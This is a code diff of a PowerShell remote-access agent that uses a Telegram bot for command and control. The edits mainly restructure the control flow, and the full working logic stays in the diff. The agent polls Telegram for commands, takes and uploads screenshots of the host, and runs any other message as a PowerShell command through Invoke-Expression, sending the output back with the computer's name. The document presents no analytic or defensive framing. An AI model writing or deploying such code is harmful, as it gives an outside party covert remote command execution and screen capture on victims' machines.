@@ -5,7 +5,9 @@ $apiUrl = "https://api.telegram.org/bot$botToken"
 
 function Send-TG ($t, $isPath=$false) {
     try {
-        if($isPath){ curl.exe -s -F "chat_id=$chatId" -F "photo=@$t" "$apiUrl/sendPhoto" }
+        if($isPath){
+            curl.exe -s -F "chat_id=$chatId" -F "photo=@$t" "$apiUrl/sendPhoto"
+        }
         else {
             $b = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $t"; parse_mode="Markdown"}
             Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b -ErrorAction Stop
@@ -13,37 +15,41 @@ function Send-TG ($t, $isPath=$false) {
     } catch { }
 }
 
-Send-TG "Agent Online"
+Send-TG "Online"
 $lastId = 0
 
 while ($true) {
     try {
         $res = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId + 1)&timeout=20" -ErrorAction Stop
-        foreach ($u in $res.result) {
-            $lastId = $u.update_id
-            $msg = $u.message.text
-            if ($u.message.from.id -eq $chatId) {
-                switch ($msg) {
-                    "/start" { Send-TG "Ready" }
-                    "/help"  { Send-TG "shot, kill, or cmd" }
-                    "shot" {
-                        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-                        $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
-                        $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
-                        $g = [Drawing.Graphics]::FromImage($b)
-                        $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
-                        $tmp = "$env:TEMP\s.png"; $b.Save($tmp, [Drawing.Imaging.ImageFormat]::Png)
-                        $g.Dispose(); $b.Dispose()
-                        Send-TG $tmp $true
-                        if(Test-Path $tmp){ rm $tmp }
-                    }
-                    "kill" { Send-TG "Offline"; exit }
-                    default {
-                        try {
-                            $out = Invoke-Expression $msg 2>&1 | Out-String
-                            $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "Done" } else { $out }
-                            Send-TG $resOut
-                        } catch { Send-TG "Error" }
+        if ($res.result) {
+            foreach ($u in $res.result) {
+                $lastId = $u.update_id
+                $msg = $u.message.text
+                if ($u.message.from.id -eq $chatId) {
+                    switch ($msg) {
+                        "/start" { Send-TG "Ready" }
+                        "/help"  { Send-TG "shot, kill, cmd" }
+                        "shot" {
+                            Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+                            $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
+                            $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
+                            $g = [Drawing.Graphics]::FromImage($b)
+                            $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
+                            $tmp = "$env:TEMP\s.png"
+                            $b.Save($tmp, [Drawing.Imaging.ImageFormat]::Png)
+                            $g.Dispose()
+                            $b.Dispose()
+                            Send-TG $tmp $true
+                            if(Test-Path $tmp){ rm $tmp }
+                        }
+                        "kill" { Send-TG "Offline"; exit }
+                        default {
+                            try {
+                                $out = Invoke-Expression $msg 2>&1 | Out-String
+                                $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "Done" } else { $out }
+                                Send-TG $resOut
+                            } catch { Send-TG "Error" }
+                        }
                     }
                 }
             }
